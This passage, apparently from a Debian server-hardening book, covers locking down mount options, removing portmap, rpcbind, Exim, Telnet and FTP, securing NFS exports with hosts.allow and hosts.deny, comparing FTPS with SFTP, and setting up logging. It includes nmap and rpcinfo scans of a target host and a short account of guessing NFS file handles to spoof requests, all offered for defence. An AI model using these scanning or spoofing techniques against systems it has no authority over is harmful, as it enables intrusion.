    UUID=<block device ID goes here> /usr ext4 defaults,nodev,ro 0 2
    # /var was on /dev/sda5 during installation
    UUID=<block device ID goes here> /var ext4 defaults,nodev 0 2
    
    # 2016-08-29 Using GParted in Knopix, I reduced the size of /var (on sda5) by 300MB
    # Ceated new partition (sda11) of 100MB for existing /var/tmp.
    # Created new partition (sda12) of 200MB for existing /var/log.
    # With the help of df -h, lsblk, and blkid, I created the following two mounts:
    UUID=<block device ID goes here> /var/tmp ext4 rw,noexec,nosuid,nodev 0 2
    UUID=<block device ID goes here> /var/log ext4 rw,noexec,nosuid,nodev 0 2
    # Then did the same thing with /usr (on sda8)
    UUID=<block device ID goes here> /usr/share ext4 nosuid,nodev,ro 0 2
    
    # Added tmpfs manually.
    tmpfs /dev/shm tmpfs defaults,nodev,nosuid,noexec 0 0
    
    # swap was on /dev/sda10 during installation
    UUID=<block device ID goes here> none swap sw 0 0
    /dev/sr0 /media/cdrom0 udf,iso9660 user,noauto 0 0
    /dev/fd0 /media/floppy0 auto rw,user,noauto 0 0

If you added any of these mounts on the machine while it was running, you could use the following command to mount them all.

{linenos=off, lang=Bash}
    sudo mount -a

Once you have booted into your machine again, you can perform some tests. 

{linenos=off, lang=Bash}
    mount
    # Relevant output lines:
    tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,noexec)
    /dev/sda11 on /var/tmp type ext4 (rw,nosuid,nodev,noexec,relatime,data=ordered)
    /dev/sda12 on /var/log type ext4 (rw,nosuid,nodev,noexec,relatime,data=ordered)
    /dev/sda13 on /usr/share type ext4 (ro,nosuid,nodev,relatime,data=ordered)

Test your `noexec` by putting the following script in `/var`, and changing the permissions on it:

{linenos=off, lang=Bash}
    # Make sure execute bits are on.
    sudo chmod 755 /var/kimsTest

Copy it to `/var/tmp`, and `/var/log`, then try running each of them. You should only be able to run the one that is in the directory mounted without the `noexec` option. My file, `kimsTest`, looks like this:

{title="kimsTest", linenos=off, lang=Bash}
    #!/bin/sh
    echo "Testing testing testing kim"

Try running them:

{linenos=off, lang=Bash}
    you@your_server:/var$ ./kimsTest
    Testing testing testing kim
    you@your_server:/var$ ./tmp/kimsTest
    -bash: ./tmp/kimsTest: Permission denied
    you@your_server:/var$ ./log/kimsTest
    -bash: ./tmp/kimsTest: Permission denied

If you set `/tmp` with `noexec` and / or `/usr` with read-only (`ro`), you will also need to modify or create `/etc/apt/apt.conf` if it does not exist, and also the referenced directory that apt will write to. The file could look something like the following:

{title="/etc/apt/apt.conf", linenos=off, lang=Bash}
    # IP is the address of your apt-cacher server
    # Port is the port that your apt-cacher is listening on, usually 3142
    Acquire::http::Proxy “http://[IP]:[Port]”;

    # http://www.debian.org/doc/manuals/securing-debian-howto/ch4.en.html#s4.10.1
    # Set an alternative temp directory to /tmp if /tmp in /etc/fstab is noexec,
    # and make sure the directory exists.
    # See following link for An alternative technique:
    # https://debian-administration.org/article/57/Making_/tmp_non-executable
    APT::ExtractTemplates::TempDir "/etc/apt/packagefiles";
    
    # If /usr in /etc/fstab is set to read-only (ro),
    # you will have to first set /usr to read-write (rw) in order to
    # install new packages, then remount according to /etc/fstab.
    # Another example here: https://frouin.me/2015/03/16/tmp-no-exec/
    DPkg
    {
       Pre-Invoke
       {  
          "mount -o remount,rw /usr";
          "mount -o remount,rw /usr/share";
       };
       Post-Invoke
       {
          "mount -o remount /usr";
          "mount -o remount /usr/share";
       };
    };

You can spend quite a bit of time experimenting with and testing your mounts. It is well worth locking these down as tightly as you can, though make sure you test properly before you reboot, unless you are happy modifying things further via a Live CD. This setup will almost certainly be imperfect, there are many options you can apply, some may work for you, some may not. Be prepared to keep adjusting these as time goes on, you will also probably find that something can not execute where it is supposed to, or some other option you have applied is causing some trouble. In this case, you may have to relax some options, or consider tightening them up more. Good security is always an iterative process. You can not know today, what you are about to learn tomorrow. 

Consider enabling a [read-only `/` mount](https://wiki.debian.org/ReadonlyRoot#Enable_readonly_root)

Also review the pros and cons of [increasing](http://www.cyberciti.biz/tips/what-is-devshm-and-its-practical-usage.html) your shared memory (via `/run/shm`) vs not doing so.

Check out the [Additional Resources](#additional-resources-vps-locking-down-the-mounting-of-partitions) chapter for extra resources in working with your mounts.

#### Portmap {#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpc-portmapper}
![](images/ThreatTags/PreventionVERYEASY.png)

{linenos=off, lang=Bash}
    dpkg-query -l '*portmap*'
    dpkg-query: no packages found matching *portmap*

If port mapper is not installed (default on debian web server), we do not need to remove it. Recent versions of Debian will use the `portmap` replacement of `rpcbind` instead. If you find port mapper is installed, you do not need it on a web server, and if you are hardening a file server, you may require `rpcbind`. For example there are two packages required if you want to support NFS on your server: nfs-kernel-server and nfs-common, the latter has a [dependency on `rpcbind`](https://packages.debian.org/stretch/nfs-common).

The `portmap` service (version 2 of the port mapper protocol) [converts](http://www.linux-nis.org/nis-howto/HOWTO/portmapper.html) RPC program numbers into TCP/IP (or UDP/IP) protocol port numbers. When an RPC server (such as NFS prior to v4) is started, it instructs the port mapper which port number it is listening on, and which RPC program numbers it is prepared to serve. When clients want to make an RPC call to a given program number, the client first contacts the `portmap` service on the server to enquire of which port number its RPC packets should be sent. [`Rpcbind`](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpcbind) which uses version 3 and 4 of the port mapper protocol (called the rpcbind protocol) does things a little differently.

You can also stop `portmap` responses by modifying the two below hosts files like so: 

{title="/etc/hosts.allow", linenos=off, lang=Bash}
    # All : ALL

{title="/etc/hosts.deny", linenos=off, lang=Bash}
    portmap : ALL

but ideally, if you do need the port mapper running, consider upgrading to `rpcbind`, then check the [`rpcbind` section](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpcbind) below for countermeasures, 

The above changes to the two hosts files are effective immediately. A restart of the port mapper is not required in this case.

There are further details specific to the `/etc/hosts.[deny & allow]` in the [NFS section](#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs)

#### Disable, Remove Exim {#vps-countermeasures-disable-remove-services-harden-what-is-left-disable-exim}
![](images/ThreatTags/PreventionEASY.png)

{linenos=off, lang=Bash}
    dpkg-query -l '*exim*'

This will probably confirm that Exim4 is currently installed.

If so, before exim4 is disabled, a `netstat -tlpn` will produce output similar to the following:

![](images/NetstatBeforeEximDisabled.png)

This shows that exim4 is listening on localhost and it is not publicly accessible. Nmap confirms this, but we do not need it, so let's disable it. You could also use the more modern `ss` program too. You may also notice `monit` and `nodejs` listening in these results. Both [`monit`](#vps-countermeasures-lack-of-visibility-proactive-monitoring-getting-started-with-monit) and our [`nodejs`](#vps-countermeasures-lack-of-visibility-proactive-monitoring-keep-nodejs-application-alive) application is set up under the Proactive Monitoring section later in this chapter.

When a [run level](https://www.debian-administration.org/article/212/An_introduction_to_run-levels) is entered, `init` executes the target files that start with `K`, with a single argument of stop, followed with the files that start with `S` with a single argument of start. By renaming `/etc/rc2.d/S15exim4` to `/etc/rc2.d/K15exim4` you are causing `init` to run the service with the stop argument when it moves to run level 2. The scripts at the end of the links with the lower numbers are executed before scripts at the end of links with the higher two digit numbers. Go ahead and check the directories for run levels 3-5 as well, and do the same. You will notice that all the links in `/etc/rc0.d/` (which are the links executed on system halt) start with `K`. Make sense?

Follow up with another `sudo netstat -tlpn`:

![](images/NetstatAfterEximDisabled.png)

This is all we should see. If you don't have monit or node running, you won't obviously see them either.

Later, I received errors from `apt-get update && upgrade`:

{linenos=off, lang=Bash}
    Setting up exim4-config (4.86.2-1) ...
    2016-03-13 12:15:50 Exim configuration error in line 186 of /var/lib/exim4/config.autogenerated.tmp:
    main option "add_environment" unknown
    Invalid new configfile /var/lib/exim4/config.autogenerated.tmp, not installing 
    /var/lib/exim4/config.autogenerated.tmp to /var/lib/exim4/config.autogenerated
    dpkg: error processing package exim4-config (--configure):
    subprocess installed post-installation script returned error exit status 1
    Errors were encountered while processing: exim4-config

Removing the following packages will solve that:

{linenos=off, lang=Bash}
    apt-get --purge remove exim4 exim4-base exim4-config exim4-daemon-light
    # Get rid of the logs if you like.
    rm -r /var/log/exim4/

#### Remove NIS
![](images/ThreatTags/PreventionEASY.png)

If Network Information Service (NIS), or its replacement NIS+ is installed, you will want to remove it. For centralised authentication for multiple machines, set up an LDAP server and configure PAM on your machines in order to contact the LDAP server for user authentication. If you are in the cloud, you could use the platform's directory service, such as [AWS Directory Service](https://aws.amazon.com/directoryservice/). We may have no need for distributed authentication on our web server at this stage.

Check to see if NIS is installed by running the following command:

{linenos=off, lang=Bash}
    dpkg-query -l '*nis*'

Nis is not installed by default on a Debian web server, so in this case, we do not need to remove it.

If the host you are hardening is a file server, running NFS, and you require directory services, then you may need Kerberos and/or LDAP. There is plenty of documentation and tutorials on Kerberos and LDAP and replacing NIS with them.

#### Rpcbind {#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpcbind}
![](images/ThreatTags/PreventionEASY.png)

One of the [differences](https://www.ibm.com/support/knowledgecenter/SSLTBW_2.2.0/com.ibm.zos.v2r2.halx001/portmap.htm) between the now deprecated [`portmap`](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpc-portmapper) service and `rpcbind` is that `portmap` returns port numbers of the server programs while rpcbind returns universal addresses. This contact detail is then used by the RPC client to know where to send its packets. In the case of a web server we have no need for this.

Spin up Nmap:

{linenos=off, lang=Bash}
    nmap -p 0-65535 <your_server>

![](images/RemoveRpcBind.png)

Because I was using a non-default port for SSH, nmap didn't announce it correctly. As shown in the Process and Practises chapter in the Penetration Testing section of Fascicle 0, using service fingerprinting techniques, it is usually easy to find out what is bound to the port. Tools such as [Unhide](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-unhide) will also show you hidden processes bound to hidden ports.

To obtain a list of currently running servers (determined by `LISTEN`) on our web server.

{linenos=off, lang=Bash}
    sudo netstat -tap | grep LISTEN

or

{linenos=off, lang=Bash}
    sudo netstat -tlpn

As per the previous netstat outputs, we see that `sunrpc` is listening on a port and was started by `rpcbind` with the PID of `1498`. Sun Remote Procedure Call is running on port `111` (the same port that `portmap` used to listen on). Netstat can tell you the port, but we have confirmed it with the nmap scan above. Rpcbind is used by NFS (as mentioned above, `rpcbind` is a dependency of nfs-common) and as we do not need or want our web server to be a NFS file server, we can remove the `rpcbind` package. If, for what ever reason you do actually need the port mapper, then make sure you lock down which hosts/networks it will respond to by modifying the `/etc/hosts.deny` and `/etc/hosts.allow` as seen in the [NFS section](#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs).

{linenos=off, lang=Bash}
    dpkg-query -l '*rpc*'

This shows us that `rpcbind` is installed, and gives us other details. If you have been following along and have made the `/usr` mount read-only, some stuff will be left behind when we try to purge:

{linenos=off, lang=Bash}
    sudo apt-get purge rpcbind

Following are the outputs of interest. If you have your mounts set up correctly, you will not see the following errors, if however you do see them, then you will need to spend some more time modifying your `/etc/fstab` as discussed above:

{linenos=off, lang=Bash}
    The following packages will be REMOVED:
    nfs-common* rpcbind*
    0 upgraded, 0 newly installed, 2 to remove and 0 not upgraded.
    Do you want to continue [Y/n]? y
    Removing nfs-common ...
    [ ok ] Stopping NFS common utilities: idmapd statd.
    dpkg: error processing nfs-common (--purge):
    cannot remove `/usr/share/man/man8/rpc.idmapd.8.gz': Read-only file system
    Removing rpcbind ...
    [ ok ] Stopping rpcbind daemon....
    dpkg: error processing rpcbind (--purge):
    cannot remove `/usr/share/doc/rpcbind/changelog.gz': Read-only file system
    Errors were encountered while processing:
    nfs-common
    rpcbind
    E: Sub-process /usr/bin/dpkg returned an error code (1)

If you received the above errors, ran the following command again:

{linenos=off, lang=Bash}
    dpkg-query -l '*rpc*'

This yields a result of `pH`, that is a desired action of (p)urge and a package status of (H)alf-installed, continue the removal of `rpcbind`, try the `purge`, `dpkg-query` and `netstat` command again to make sure `rpcbind` is gone and of course no longer listening.

You can also remove unused dependencies now, after you receive the following message:

{linenos=off, lang=Bash}
    The following packages were automatically installed and are no longer required:
    libevent-2.0-5 libgssglue1 libnfsidmap2 libtirpc1
    Use 'apt-get autoremove' to remove them.
    The following packages will be REMOVED:
    rpcbind*
 
 {linenos=off, lang=Bash}
    sudo apt-get -s autoremove

I always want to simulate what is going to be removed because I am paranoid and have made stupid mistakes with autoremove years ago, and that pain has stuck with me ever since. I once auto-removed a meta-package which depended on many other packages. A subsequent autoremove for packages that had a sole dependency on the meta-package meant they would be removed. Yes, it was a painful experience. `/var/log/apt/history.log` has your recent apt history. I used this to piece back together my system.

Then follow up with the real thing: remove the `-s` and run it again. Just remember, the less packages your system has, the less code there is for an attacker to exploit.

The port mapper should never be visible from a hostile network, especially the Internet. The same goes for all RPC servers due to reflected and often amplified DoS attacks.

You can also stop `rpcbind` responses by modifying the two below hosts files like so: 

{title="/etc/hosts.allow", linenos=off, lang=Bash}
    # All : ALL

{title="/etc/hosts.deny", linenos=off, lang=Bash}
    rpcbind : ALL

The above changes to the two hosts files are effective immediately. A restart of the port mapper would not be required in this case.

There are further details specific to the `/etc/hosts.[deny & allow]` files in the [NFS section](#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs) that will help you fine tune which hosts and networks should be permitted to query and receive response from the port mapper. Be sure to check them out if you are going to retain the port mapper, so you do not become a victim of a reflected amplified DoS attack, while keeping any RPC servers that you may need exposed to your internal clients. You can test this by running the same command that we did in the [Identify Risks](#vps-identify-risks-unnecessary-and-vulnerable-services-portmap-rpcinfo-t) section.

{title="rpcinfo", linenos=off, lang=bash}
    rpcinfo -T udp <target host> 

This time, with the two hosts files set-up as above, the results should look like the following:

{title="rpcinfo results", linenos=off, lang=bash}
    No remote programs registered.

You will notice in the response as recorded by Wireshark, that the length is now smaller than the request:

{title="wireshark results", linenos=off, lang=bash}
    Source      Destination Protocol Length Info
    <source IP> <dest IP>   Portmap  82     V3 DUMP Call (Reply In 76)
    <dest IP>   <source IP> Portmap  70     V3 DUMP Reply (Call In 75)

#### Remove Telnet {#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-telnet}
![](images/ThreatTags/PreventionEASY.png)

Do not use Telnet for your systems, SSH provides encrypted shell access and was designed to replace Telnet. Use SSH instead, there are also many ways you can [harden SSH](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-hardening-ssh).

{linenos=off, lang=Bash}
    dpkg-query -l '*telnet*'

Telnet installed?

{linenos=off, lang=Bash}
    sudo apt-get remove telnet

Telnet gone?

{linenos=off, lang=Bash}
    dpkg-query -l '*telnet*'

#### Remove FTP {#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-ftp}
![](images/ThreatTags/PreventionEASY.png)

There is no place for FTP, even on a secure network, as the network you think may be safe remains a perfect place for exploitation, per the Fortress Mentality, as discussed in the Physical and Network chapters.

{linenos=off, lang=Bash}
    dpkg-query -l '*ftp*'

Ftp installed?

{linenos=off, lang=Bash}
    sudo apt-get remove ftp

Ftp gone?

{linenos=off, lang=Bash}
    dpkg-query -l '*ftp*'

Let's take a look at FTPS, SFTP and SCP

**FTPS is FTP over TLS with some issues**

There are two separate methods to invoke FTPS client security, defined by which port they initiate communications with:

1. Implicit   
   The client is expected to immediately challenge the FTPS server with a TLS `ClientHello` message before any other FTP commands are sent by the client. If the FTPS server does not receive the initial TLS `ClientHello` message first, the server should drop the connection.  
   
   Implicit also requires that all communications of the FTP session be encrypted.  
   
   In order to maintain compatibility with existing FTP clients, implicit FTPS is expected to also listen on the command/control channel using port 990/TCP, and the data channel using port 989/TCP. This leaves port 21/TCP for legacy unencrypted communication. Using port 990 implicitly implies encryption is mandatory.  
   
   This is the earliest implementation and considered deprecated.  
   
2. Explicit  
   The client starts a conversation with the FTPS server on port 21/TCP and then requests an upgrade to a mutually agreed encryption method. The FTPS server can then decide to allow the client to continue an unencrypted conversation or not. The client has to ask for the security upgrade.  
   
   This method also allows the FTPS client to decide whether they want to encrypt nothing, encrypt just the command channel (which the credentials are sent over), or encrypt everything.

As you can see, it is quite conceivable that a user may become confused as to whether encryption is on, is not on, which channel it is applied to, and not applied to. The user has to understand the differences between the two methods of invoking security, not invoking it at all, or only on one of the channels.

One thing that you really do not want, when it comes to privacy, is confusion. When it comes to SFTP or any protocol over SSH, everything is encrypted, simple as that.

Similar to a web server serving HTTPS with a public key certificate, an FTPS server will also respond with its public key certificate (keeping its private key private). The public key certificate it responds with needs to be generated from a Certificate Authority (CA), whether it is one the server administrator has created (self signed), or a public "trusted" CA (often paid for). The CA (root) certificate must be copied and/or reside locally to the FTPS client. The checksum of the CA (root) certificate will need to be verified as well.

If the FTPS client does not already have the CA (root) certificate when the user initiates a connection, the FTPS client should generate a warning due to the fact that the CA (root) certificate is not yet trusted.

This process is quite complicated and convoluted, as opposed to FTP over SSH.

{#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-ftp-sftp}
**SFTP is FTP over SSH**

As I have already detailed in the section [SSH Connection Procedure](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-ssh-connection-procedure), when the SSH channel is first set up, thus the client is already authenticated, and their identity is available to the FTP protocol or any protocol wishing to use the encrypted channel. The public key is securely copied from the client to the server out-of-band. If the configuration of SSH is carried out correctly and hardened as I detailed throughout the [SSH](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh) countermeasures section, the SFTP, and any protocol for that matter, over SSH has the potential for greater security than those using the Trusted Third Party (TTP) model, which X.509 certificates (utilised in FTPS, HTTPS, OpenVPN, not the [less secure IPSec](http://louwrentius.com/why-you-should-not-use-ipsec-for-vpn-connectivity.html)) rely on.

Why is SSH capable of a higher level of security?

With SSH, you copy the public key that you created on your client using `ssh-copy-id` to the server. There are no other parties involved. Even if the public key is compromised, unless the attacker has the private key, which never leaves the client, they can not be authenticated to the server and they can not MItM your SSH session. A MItM attack would lead to a warning due to the key fingerprint of the MItM failing to match that in your `known_hosts` file. Even if an attacker managed to get close to your private key, SSH will not run if the permissions of the `~/.ssh/` directory, and files within, are set to permissive. Even then, if somehow the private key was compromised, the attacker still needs the passphrase. SSH is a perfect example of defence in depth.

With X.509 certificates, you rely (trust) on the third party (the CA). When the third party is compromised (as happens frequently), many things can go wrong, some of which are discussed in the [X.509 Certificate Revocation Evolution](#network-countermeasures-tls-downgrade-x509-cert-revocation-evolution) section of the Network chapter. The compromised CA can start issuing certificates to malicious entities. All that may be necessary at this point is for your attacker to [poison your ARP cache](#network-identify-risks-spoofing-arp) if you are relying on IP addresses, or add DNS poisoning. This attack is detailed under the [Spoofing Website](#network-identify-risks-spoofing-website) section in the Network chapter, was demoed at WDCNZ 2015, and has video available.

The CA root certificate must be removed from all clients, and you will need to go through the process of creating/obtaining a new certificate with a CA that isn't compromised. With SSH, you only have to trust yourself, and I have detailed what you need to know to make good decisions in the SSH section.

SSH not only offers excellent security, but is also extremely versatile.

{#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-ftp-scp}
[**SCP**](https://blog.binarymist.net/2012/03/25/copying-with-scp/), or Secure Copy, leverages the security of SSH, and provides simple copy to and from. Once you have SSH set-up and hardened, you are safe to pull and push files around your networks securely with SSH. The SFTP protocol provides remote file system capabilities, such as remote file deletion, directory listings, and resumption of interrupted transfers. If you do not require the additional features of (S)FTP, SCP may be a good option for you. Like SSH, SCP does not have native platform support on Windows, although Windows support is available, and easy enough to set up, as I [have done many times](https://blog.binarymist.net/2011/12/27/openssh-from-linux-to-windows-7-via-tunneled-rdp/).

Any features that you may think missing when using SCP rather than SFTP are more than made up for simply by using SSH, which in itself provides a complete remote Secure Shell, and is very flexible as to how you can use it.

Another example is the use of [**Rsync over SSH**](https://blog.binarymist.net/2011/03/06/rsync-over-ssh-from-linux-workstation-to-freenas/), which is an excellent way to sync files between machines. Rsync will only copy the files that have been changed since the last sync, so this can be extremely quick.

{linenos=off, lang=Bash}
    # -a, --archive  is archive mode which actually includes -rlptgoD (no -H,-A,-X)
    rsync -vva --delete --force -e 'ssh -p <non default port>' <source dir> <myuser>@<myserver>:<dest dir>

For Windows machines, I also run all of my **RDP sessions over SSH**, see my blog post for further details: [https://blog.binarymist.net/2010/08/26/installation-of-ssh-on-64bit-windows-7-to-tunnel-rdp/](https://blog.binarymist.net/2010/08/26/installation-of-ssh-on-64bit-windows-7-to-tunnel-rdp/)

{linenos=off, lang=Bash}
    # 3391 is any spare port on localhost.
    # 3389 is the port that RDP listens on at MyWindowsBox
    ssh -v -f -L 3391:localhost:3389 -N MyUserName@MyWindowsBox
    # Once the SSH channel is up, Your local RDP client just needs to talk to localhost:3391    

There is no reason to not have all of your inter-machine communications encrypted, whether they be on the Internet, or on what you think is a trusted LAN. Remember, firewalls are just another layer of defence and [nothing more](#vps-identify-risks-lack-of-firewall).

#### NFS {#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs}
![](images/ThreatTags/PreventionAVERAGE.png)

You should not need NFS running on a web server. The packages required for the NFS server are nfs-kernel-server, which has a dependency on nfs-common (common to server and clients), which also has a dependency of rpcbind.

NFSv4 (December 2000) no longer requires the [portmap](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpc-portmapper) service. Rpcbind is the replacement.

Issue the following command to confirm that the NFS server is not installed:

{linenos=off, lang=Bash}
    dpkg-query -l '*nfs*'

This may show you that you have nfs-common installed, but ideally you do not want nfs-kernel-server installed. If it is, you can just:

{linenos=off, lang=Bash}
    apt-get remove nfs-kernel-server

If you do need NFS running for a file server, the files that need configuration will be the following:

* `/etc/exports` (Only file required to actually export your shares)
* `/etc/hosts.allow`
* `/etc/hosts.deny`

Check that these files permissions are `644`, owned by `root`, with group of `root` or `sys`.

The above `hosts.[allow | deny]` provide the accessibility options. You really need to lock these down if you intend to use NFS in a somewhat secure fashion.

The [exports](https://linux.die.net/man/5/exports) man page has all the details (and some examples) you need, but I will cover some options here.

In the example below `/dir/you/want/to/export` is the directory (and sub directories) that you want to share. These could also be an entire volume, but keeping things as small as possible is a good start.

{title="/etc/exports", linenos=off, lang=Bash}
    </dir/you/want/to/export>   machine1(option1,optionn) machine2(option1,optionn) machinen(option1,optionn)

`machine1`, `machine2`, `machinen` are the machines that you want to have access to the specified exported share. These can be specified as their DNS names or IP addresses, using IP addresses can be a little more secure and reliable than using DNS addresses. If using DNS, make sure the names are fully qualified domain names.

Some of the more important options are:

* `ro`: The client will not be able to write to the exported share (this is the default), and I do not use `rw` which allows the client to also write.
* `root_squash`: This prevents remote root users who are connected from also having root privileges, assigning them the user ID of the `nfsnobody`, thus effectively "squashing" the power of the remote user to the lowest privileges possible on the server. Even better, use `all_squash`.
* From 1.1.0 of `nfs-utils` onwards, `no_subtree_check` is a default. `subtree_check` was the previous default, which would cause a routine to verify that files requested by the client were in the appropriate part of the volume. The `subtree_check` caused more issues than it solved.
* `fsid`: is used to specify the file system that is exported, this could be a UUID, or the device number. NFSv4 clients have the ability to see all of the exports served by the NFSv4 server as a single file system. This is called the NFSv4 pseudo-file system. This pseudo-file system is identified as a [single, real file system](https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-nfs-server-config-exports.html#id3077674), identified at export with the `fsid=0` option.
* `anonuid` and `anongid` explicitly set the uid and gid of the anonymous account. This option makes all requests look like they come from a specific user. By default the uid and gid of 65534 is used by exportfs for squashed access. These two options allow us to override the uid and gid values.

Following is one of the configs I have used on several occasions: 

{title="/etc/exports", linenos=off, lang=Bash}
    # Allow read only access to all hosts within subnet to the /dir/you/want/to/export directory
    # as user nfsnobody.
    </dir/you/want/to/export>   10.10.0.0/24(ro,fsid=0,sync,root_squash,no_subtree_check,anonuid=65534,anongid=65534)

In addition to this sort of configuration, you need to make sure that the local server mounts are as restrictive as we set up in the ["Lock Down the Mounting of Partitions"](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions) section. The file permissions for other, at the exported level recursively, should also be as restrictive as practical for you. Now we start to achieve a little defence in depth.

If you have been following along with the NFS configuration, because you are working on a file server rather than a web server, let's take this further with some changes to `/etc/hosts.deny` and `/etc/hosts.allow`.  
The access control language used in these two files is the same as each other, just that `hosts.deny` is consulted to deny access to services, and `hosts.allow` defines allows for the same.

Each line of these two files specifies (in the simplest form) a single service or process and a set of hosts in numeric form (not DNS). In the more complex forms, you'll see _daemon@host_ and _user@host_.

You can add `ALL:ALL` to your `hosts.deny`, but if you install a new service that uses these files, then you will be left wondering why it is not working. I prefer to be more explicit, but it is up to you.

{title="/etc/hosts.deny", linenos=off, lang=Bash}
    rpcbind : ALL

{title="/etc/hosts.allow", linenos=off, lang=Bash}
    rpcbind : 10.10.0.10 10.10.0.11 10.10.0.n

    # Or if you are confident you have enough defence in depth
    # and need to open to your network segment:
    rpcbind : 10.10.0.0/24

Prior to NFSv4 to achieve the same results, these two files would need to contain something similar to the following. [NFSv4 has no interaction](https://www.centos.org/docs/5/html/Deployment_Guide-en-US/ch-nfs.html) with these additional daemons, as their functionality has been incorporated into the version 4 protocol and NFS (v4) listens on the well known TCP port 2049:

{title="/etc/hosts.deny", linenos=off, lang=Bash}
    portmap : ALL
    lockd   : ALL
    mountd  : ALL
    rquotad : ALL
    statd   : ALL

{title="/etc/hosts.allow", linenos=off, lang=Bash}
    portmap : 10.10.0.10 10.10.0.11 10.10.0.n
    lockd   : 10.10.0.10 10.10.0.11 10.10.0.n
    mountd  : 10.10.0.10 10.10.0.11 10.10.0.n
    rquotad : 10.10.0.10 10.10.0.11 10.10.0.n
    statd   : 10.10.0.10 10.10.0.11 10.10.0.n

    # Or if you are confident you have enough defence in depth
    # and need to open to your network segment:
    portmap : 10.10.0.0/24
    lockd   : 10.10.0.0/24
    mountd  : 10.10.0.0/24
    rquotad : 10.10.0.0/24
    statd   : 10.10.0.0/24

You can reload your config, that is re-export your exports `/etc/exports` with a restart of NFS:

{linenos=off, lang=Bash}
    service nfs-kernel-server [restart | stop, start]

Although that is not really necessary, a simple

{linenos=off, lang=Bash}
    exportfs -ra

is sufficient. Both exports and exportfs man pages are good for additional insight.

Then run another `showmount` to audit your exports:

{linenos=off, lang=bash}
    showmount -e <target host>

&nbsp;

A client communicates with the server's mount daemon. If the client is authorised, the mount daemon then provides the root file handle of the exported filesystem to the client, at which point the client can send packets referencing the file handle. Making correct guesses of valid file handles can often be easy. The file handles consist of:

1. A filesystem Id (visible in `/etc/fstab` usually world readable, or by running `blkid`).
2. An inode number. For example, the `/` directory on the standard Unix filesystem has the inode number of 2, `/proc` is 1. You can see these with `ls -id <target dir>`
3. A generation count, this value can be a little more fluid, although many inodes such as the `/` are not deleted very often, so the count remains small and reasonably guessable. Using a tool `istat` can provide these details if you want to have a go at it.

Thus allowing a spoofing type of attack, which has been made more difficult by the following measures:

1. Prior to NFS version 4, UDP could be used (making spoofed requests easier) which allowed an attacker to perform Create, Read, Update, Delete (CRUD) operations on the exported file system(s)
2. By default `exportfs` is run with the `secure` option, requiring that requests originate from a privileged port (<1024). We can see, with the following commands, that this is the case, so whoever attempts to mount an export must be root.

{linenos=off, lang=bash}
    # From a client:
    netstat -nat | grep <nfs host>
    # Produces:
    tcp 0 0 <nfs client host>:702 <nfs host>:2049 ESTABLISHED

Or with the newer Socket Statistics:

{linenos=off, lang=bash}
    # From a client:
    ss -pn | grep <nfs host>
    # Produces:
    tcp ESTAB 0 0 <nfs client host>:702 <nfs host>:2049

Prior to mitigations for this spoofing vulnerability, one option was to randomise the generation number of every inode on the filesystem using a tool `fsirand`, which was available for some versions of Unix, although not Linux. This made guessing the generation number harder, thus mitigating spoofing attacks. This would usually be scheduled to run once a month.

Run `fsirand` on the `/` directory while in single-user mode  
or  
on un-mounted filesystems, run `fsck`, and if no errors are produced, run `fsirand`

{linenos=off, lang=bash}
    umount <filesystem> # /dev/sda1 for example
    fsck <filesystem> # /dev/sda1 for example
    # Exit code of 0 means no errors.
    fsirand <filesystem> # /dev/sda1 for example

### Lack of Visibility {#vps-countermeasures-lack-of-visibility}

**Some Useful Visibility Commands**

Check who is currently logged in to your server and what they are doing:  
`who` and `w`  

Check who has recently logged into your server, I mentioned this command previously:  
`last -ad`

Check which user has failed login attempts, mentioned this command previously:  
`lastb -ad`

Check the most recent login of all users, or of a given user. `lastlog` sources data from the binary file:  
`/var/log/lastlog`  
`lastlog`

#### [Logging and Alerting](https://medium.com/starting-up-security/learning-from-a-year-of-security-breaches-ed036ea05d9b#41e1) {#vps-countermeasures-lack-of-visibility-logging-and-alerting}
![](images/ThreatTags/PreventionEASY.png)

%% This section is also linked to from the "Insufficient Logging and Monitoring" section in web applications.

I recently performed an [in-depth evaluation](#vps-countermeasures-lack-of-visibility-web-server-log-management) of a small collection of logging and alerting offerings. I chose candidates for the in-depth evaluation from an [initial evaluation](#vps-countermeasures-lack-of-visibility-logging-and-alerting-initial-evaluation).

It is very important to make sure you have reliable and all-encompassing logging shipped to an offsite location. This way attackers will also have to compromise the offsite location in order to effectively [cover their tracks](http://www.win.tue.nl/~aeb/linux/hh/hh-13.html).

You can often see in the logs when access has been granted to an entity, and when files have been modified or removed. Become familiar with what your logs look like and which events create which messages. A good sysadmin can review logs and quickly see anomalies. If you keep your log aggregator open, at least whenever you're working on servers that generate events, you will quickly get used to recognising which events cause which log entries.

Alerting events should also be set up for expected and unexpected actions, along with a dead man's snitch.

Make sure you have reviewed who can [write and read](http://www.tldp.org/HOWTO/Security-HOWTO/secure-prep.html#logs) your logs, especially those created by the `auth` facility, and make any modifications necessary to the permissions.

In order to have logs that provide the information you need, you need to make sure the logging level is set to produce the required amount of verbosity and that time stamps are synchronised across your network. You must also archive logs for long enough to be able to diagnose malicious activity and movements across the network.

The ability to rely on the times of events on different network nodes is essential to making sense of tracking an attacker's movements through your network. I discuss setting up Network Time Protocol (NTP) on your networked machines in the [Network](#network-countermeasures-fortress-mentality-insufficient-logging-ntp) chapter.

{#vps-countermeasures-lack-of-visibility-logging-and-alerting-initial-evaluation}
